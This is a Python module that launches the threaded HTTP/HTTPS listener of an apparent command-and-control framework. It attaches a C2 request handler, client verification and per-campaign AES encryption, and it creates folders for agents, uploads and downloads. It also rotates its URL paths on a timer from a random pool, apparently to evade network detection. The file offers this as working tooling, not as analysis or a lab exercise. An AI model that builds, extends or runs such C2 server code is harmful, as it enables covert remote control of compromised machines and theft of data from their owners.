import socketserver
import threading
import os
import ssl
import json
import datetime
import inspect
from core.crypto import KeyManager
from core.crypto import CryptoManager
from utils.client_identity import ClientVerifier
from utils.c2_handler import C2RequestHandler

# Explicit import to ensure we're getting the right class
from utils.path_rotation import PathRotationManager


class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """This server handles each request in a separate thread."""
    daemon_threads = True  # ensures threads exit when main thread does

# Global variable to hold the server instance
httpd = None

def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ssl=False, cert_path=None, key_path=None, 
                   url_paths=None, path_rotation=True, rotation_interval=3600, path_pool_size=30):
    """
    Starts the web server in a separate thread.
    
    Args:
        ip: IP address to bind to
        port: Port to listen on
        client_manager: Client manager instance
        logger: Logging function
        campaign_name: Name of the campaign (optional)
        use_ssl: Whether to use SSL/TLS
        cert_path: Path to SSL certificate file (if use_ssl is True)
        key_path: Path to SSL key file (if use_ssl is True)
        url_paths: Dictionary of URL paths (ignored in pool-only mode)
        path_rotation: Whether to enable path rotation
        rotation_interval: Interval for path rotation in seconds
        path_pool_size: Size of the path pool for random selection (increased default to 30)
    """
    global httpd
    try:
        # If campaign_name is not provided, try to determine it
        if not campaign_name:
            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
            if campaign_dirs:
                campaign_name = campaign_dirs[0][:-9]  # Remove "_campaign" suffix
            else:
                campaign_name = "default_campaign"
        
        campaign_folder = f"{campaign_name}_campaign"
        
        # Create crypto manager for this campaign
        crypto_manager = CryptoManager(campaign_name)
        
        # Create client verifier for this campaign
        client_verifier = ClientVerifier(campaign_folder)
        
        # Create path rotation manager with only pool paths
        path_manager = None
        if path_rotation:
            # Debug info to verify the PathRotationManager class
            logger(f"Creating pool-only PathRotationManager with path_pool_size={path_pool_size}")
            
            # Create the PathRotationManager instance with explicit keyword arguments
            path_manager = PathRotationManager(
                campaign_folder=campaign_folder,  
                logger=logger, 
                initial_paths=None,  # No initial paths needed for pool-only mode
                rotation_interval=rotation_interval,
                pool_size=path_pool_size
            )
            
            # Load existing state if available
            path_manager.load_state()
            logger(f"Path rotation enabled with interval {rotation_interval} seconds and pool size {path_pool_size}")
            
            # Log the pool size
            current_paths = path_manager.get_current_paths()
            if "path_pool" in current_paths:
                logger(f"Generated path pool with {len(current_paths['path_pool'])} paths")
        
        # Create server with necessary attributes
        httpd = ThreadedHTTPServer((ip, port), C2RequestHandler)
        
        # Attach all necessary objects to server instance so handler can access them
        httpd.client_manager = client_manager
        httpd.logger_func = logger
        httpd.crypto_manager = crypto_manager
        httpd.campaign_name = campaign_name
        
        # No URL paths needed in pool-only mode
        httpd.url_paths = {"path_pool": []}
        
        # Attach the client verifier to the server
        httpd.client_verifier = client_verifier
        
        # Attach path rotation manager to the server if enabled
        if path_rotation:
            httpd.path_manager = path_manager
            httpd.path_rotation_interval = rotation_interval
            httpd.path_pool_size = path_pool_size
        
        # Configure SSL if requested
        if use_ssl and cert_path and key_path:
            if os.path.exists(cert_path) and os.path.exists(key_path):
                try:
                    # Create SSL context
                    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                    ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
                    
                    # Wrap the socket with the SSL context
                    httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)
                    logger(f"SSL enabled with certificate {cert_path} and key {key_path}")
                except ssl.SSLError as e:
                    logger(f"SSL configuration failed: {e}")
                    raise
            else:
                logger("SSL certificate or key file not found, continuing without SSL")
        
        # Start the server in a separate thread
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True  # Allow the main program to exit even if the server is running
        server_thread.start()
        
        # Log server startup
        protocol = "https" if use_ssl and cert_path and key_path else "http"
        logger(f"Webserver started at {protocol}://{ip}:{port} for campaign '{campaign_name}'")
        logger(f"All traffic will be encrypted using AES-256-CBC with pre-shared keys")
        
        # Log path information
        if path_rotation:
            next_rotation = path_manager.get_next_rotation_time()
            current_paths = path_manager.get_current_paths()
            logger(f"Dynamic path rotation enabled - Current rotation ID: {path_manager.rotation_counter}")
            logger(f"Path pool size: {path_pool_size} paths for random URL selection")
            logger(f"Next path rotation scheduled at: {datetime.datetime.fromtimestamp(next_rotation).strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Log summary of path types
            if "path_pool" in current_paths:
                path_pool = current_paths["path_pool"]
                file_paths = sum(1 for p in path_pool if "/file/" in p or "/download/" in p or "/upload/" in p or "/content/" in p)
                logger(f"Path pool contains {len(path_pool)} paths ({file_paths} file operation paths)")
        else:
            logger(f"Path rotation disabled - using default paths")
        
        # Create necessary campaign directories
        os.makedirs(os.path.join(campaign_folder, "uploads"), exist_ok=True)
        os.makedirs(os.path.join(campaign_folder, "agents"), exist_ok=True)
        os.makedirs(os.path.join(campaign_folder, "downloads"), exist_ok=True)
        
        return server_thread
    except Exception as e:
        logger(f"Error starting webserver: {e}")
        import traceback
        logger(f"Traceback: {traceback.format_exc()}")
        raise
    
def stop_webserver():
    """Stops the web server."""
    global httpd
    if httpd:
        httpd.shutdown()
        httpd.server_close()
        httpd = None